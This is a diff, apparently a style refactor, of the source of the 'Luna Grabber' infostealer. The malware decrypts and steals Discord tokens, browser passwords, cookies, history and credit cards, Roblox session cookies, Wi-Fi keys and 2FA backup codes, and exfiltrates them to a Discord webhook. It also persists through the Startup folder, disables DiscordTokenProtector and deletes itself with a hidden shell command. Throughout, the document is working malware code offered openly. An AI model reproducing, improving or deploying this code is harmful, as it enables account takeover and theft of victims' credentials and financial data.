@@ -73,7 +73,7 @@ def main(webhook: str):
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
             content = f"@{__CONFIG__['pingtype'].lower()}"
-            data.update({"content": content})
+            data["content"] = content
 
     if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
         with open(_file, 'rb') as file:
@@ -132,11 +132,7 @@ def fakeerror():
 
 def startup():
     startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    if hasattr(sys, 'frozen'):
-        source_path = sys.executable
-    else:
-        source_path = sys.argv[0]
-
+    source_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
     target_path = os.path.join(startup_path, os.path.basename(source_path))
     if os.path.exists(target_path):
         os.remove(target_path)
@@ -163,7 +159,7 @@ def create_temp(_dir: str or os.PathLike = None):
 def killprotector():
     roaming = os.getenv('APPDATA')
     path = f"{roaming}\\DiscordTokenProtector\\"
-    config = path + "config.json"
+    config = f"{path}config.json"
 
     if not os.path.exists(path):
         return
@@ -218,8 +214,19 @@ class PcInfo:
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
-                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
+        ram = str(
+            int(
+                subprocess.run(
+                    'wmic computersystem get totalphysicalmemory',
+                    capture_output=True,
+                    shell=True,
+                )
+                .stdout.decode(errors='ignore')
+                .strip()
+                .split()[1]
+            )
+            // 1000000000
+        )
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
@@ -285,8 +292,7 @@ class Discord:
         local_state = json.loads(c)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
     def grabTokens(self):
         paths = {
@@ -323,13 +329,18 @@ class Discord:
                 continue
             disc = name.replace(" ", "").lower()
             if "cord" in path:
-                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
+                if os.path.exists(f'{self.roaming}\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if file_name[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                token = self.decrypt_val(
+                                    base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
+                                    self.get_master_key(
+                                        f'{self.roaming}\\{disc}\\Local State'
+                                    ),
+                                )
                                 r = requests.get(self.baseurl, headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
@@ -373,62 +384,58 @@ class Discord:
                                     self.ids.append(uid)
 
     def robloxinfo(self, webhook):
-        if __CONFIG__["roblox"]:
-            with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
-                robo_cookie = f.read().strip()
-                if robo_cookie == "No Roblox Cookies Found":
+        if not __CONFIG__["roblox"]:
+            return
+        with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
+            robo_cookie = f.read().strip()
+            if robo_cookie != "No Roblox Cookies Found":
+                headers = {"Cookie": f".ROBLOSECURITY={robo_cookie}"}
+                info = None
+                try:
+                    response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
+                    response.raise_for_status()
+                    info = response.json()
+                except requests.exceptions.HTTPError:
                     pass
-                else:
-                    headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-                    info = None
-                    try:
-                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
-                        response.raise_for_status()
-                        info = response.json()
-                    except requests.exceptions.HTTPError:
-                        pass
-                    except requests.exceptions.RequestException:
-                        pass
-                    if info is not None:
-                        data = {
-                            "embeds": [
-                                {
-                                    "title": "Roblox Info",
-                                    "color": 5639644,
-                                    "fields": [
-                                        {
-                                            "name": "<:roblox_icon:1041819334969937931> Name:",
-                                            "value": f"`{info['UserName']}`",
-                                            "inline": True
-                                        },
-                                        {
-                                            "name": "<:robux_coin:1041813572407283842> Robux:",
-                                            "value": f"`{info['RobuxBalance']}`",
-                                            "inline": True
-                                        },
-                                        {
-                                            "name": "🍪 Cookie:",
-                                            "value": f"`{robo_cookie}`"
-                                        }
-                                    ],
-                                    "thumbnail": {
-                                        "url": info['ThumbnailUrl']
+                except requests.exceptions.RequestException:
+                    pass
+                if info is not None:
+                    data = {
+                        "embeds": [
+                            {
+                                "title": "Roblox Info",
+                                "color": 5639644,
+                                "fields": [
+                                    {
+                                        "name": "<:roblox_icon:1041819334969937931> Name:",
+                                        "value": f"`{info['UserName']}`",
+                                        "inline": True
                                     },
-                                    "footer": {
-                                        "text": "Luna Grabber | Created By Smug"
+                                    {
+                                        "name": "<:robux_coin:1041813572407283842> Robux:",
+                                        "value": f"`{info['RobuxBalance']}`",
+                                        "inline": True
                                     },
-                                }
-                            ],
-                            "username": "Luna",
-                            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-                        }
-                        requests.post(webhook, json=data)
+                                    {
+                                        "name": "🍪 Cookie:",
+                                        "value": f"`{robo_cookie}`"
+                                    }
+                                ],
+                                "thumbnail": {
+                                    "url": info['ThumbnailUrl']
+                                },
+                                "footer": {
+                                    "text": "Luna Grabber | Created By Smug"
+                                },
+                            }
+                        ],
+                        "username": "Luna",
+                        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                    }
+                    requests.post(webhook, json=data)
 
     def upload(self, webhook):
         for token in self.tokens:
-            if token in self.tokens_sent:
-                pass
-
             val_codes = []
             val = ""
             nitro = ""
@@ -445,11 +452,7 @@ class Discord:
             phone = user['phone']
             email = user['email']
 
-            if user['mfa_enabled']:
-                mfa = "✅"
-            else:
-                mfa = "❌"
-
+            mfa = "✅" if user['mfa_enabled'] else "❌"
             premium_types = {
                 0: "❌",
                 1: "Nitro Classic",
@@ -629,8 +632,7 @@ class Browsers:
             local_state = json.loads(c)
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
+            return CryptUnprotectData(master_key, None, None, None, 0)[1]
         except:
             pass
 
@@ -643,7 +645,7 @@ class Browsers:
         return decrypted_pass
 
     def passwords(self, name: str, path: str, profile: str):
-        if name == 'opera' or name == 'opera-gx':
+        if name in {'opera', 'opera-gx'}:
             path += '\\Login Data'
         else:
             path += '\\' + profile + '\\Login Data'
@@ -667,7 +669,7 @@ class Browsers:
         conn.close()
 
     def cookies(self, name: str, path: str, profile: str):
-        if name == 'opera' or name == 'opera-gx':
+        if name in {'opera', 'opera-gx'}:
             path += '\\Network\\Cookies'
         else:
             path += '\\' + profile + '\\Network\\Cookies'
@@ -689,7 +691,7 @@ class Browsers:
         os.remove(cookievault)
 
     def history(self, name: str, path: str, profile: str):
-        if name == 'opera' or name == 'opera-gx':
+        if name in {'opera', 'opera-gx'}:
             path += '\\History'
         else:
             path += '\\' + profile + '\\History'
@@ -708,7 +710,7 @@ class Browsers:
         conn.close()
 
     def credit_cards(self, name: str, path: str, profile: str):
-        if name in ['opera', 'opera-gx']:
+        if name in {'opera', 'opera-gx'}:
             path += '\\Web Data'
         else:
             path += '\\' + profile + '\\Web Data'
@@ -728,20 +730,19 @@ class Browsers:
         conn.close()
 
     def roblox_cookies(self):
+        if not __CONFIG__["roblox"]:
+            return
+        robo_cookie = ""
         robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
 
-        if not __CONFIG__["roblox"]:
-            pass
-        else:
-            robo_cookie = ""
-            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
-                with open(robo_cookie_file, 'w', encoding="utf-8") as f:
-                    for line in g:
-                        if ".ROBLOSECURITY" in line:
-                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
-                            f.write(robo_cookie + "\n\n")
-                    if os.path.getsize(robo_cookie_file) == 0:
-                        f.write("No Roblox Cookies Found")
+        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
+            with open(robo_cookie_file, 'w', encoding="utf-8") as f:
+                for line in g:
+                    if ".ROBLOSECURITY" in line:
+                        robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
+                        f.write(robo_cookie + "\n\n")
+                if os.path.getsize(robo_cookie_file) == 0:
+                    f.write("No Roblox Cookies Found")
 
 class Wifi:
     def __init__(self):
@@ -762,10 +763,9 @@ class Wifi:
                 split_key = command.split('Key Content')
                 tmp = split_key[1].split('\n')[0]
                 key = tmp.split(': ')[1]
-                self.name_pass[i] = key
             else:
                 key = ""
-                self.name_pass[i] = key
+            self.name_pass[i] = key
         os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
         with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
             for i, j in self.name_pass.items():
@@ -813,7 +813,7 @@ class BackupCodes:
             os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
             with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                 with open(self.path + self.code_path, 'r') as g:
-                    for line in g.readlines():
+                    for line in g:
                         if line.startswith("*"):
                             f.write(line)
             f.close()
@@ -831,12 +831,11 @@ class AntiSpam:
                 code = f.read()
                 if code != "":
                     old_time = float(code)
-                    if current_time - old_time > 60:
-                        with open(f"{temp}\\dd_setup.txt", "w") as f:
-                            f.write(str(current_time))
-                        return False
-                    else:
+                    if current_time - old_time <= 60:
                         return True
+                    with open(f"{temp}\\dd_setup.txt", "w") as f:
+                        f.write(str(current_time))
+                    return False
         except FileNotFoundError:
             with open(f"{temp}\\dd_setup.txt", "w") as g:
                 g.write(str(current_time))
@@ -849,14 +848,15 @@ class SelfDestruct():
         self.delete()
 
     def getfile(self):
-        if hasattr(sys, 'frozen'):
-            return (sys.executable, True)
-        else:
-            return (__file__, False)
+        return (sys.executable, True) if hasattr(sys, 'frozen') else (__file__, False)
 
     def delete(self):
         if self.frozen:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            subprocess.Popen(
+                f'ping localhost -n 3 > NUL && del /F "{self.path}"',
+                shell=True,
+                creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE,
+            )
             os._exit(0)
         else:
             os.remove(self.path)
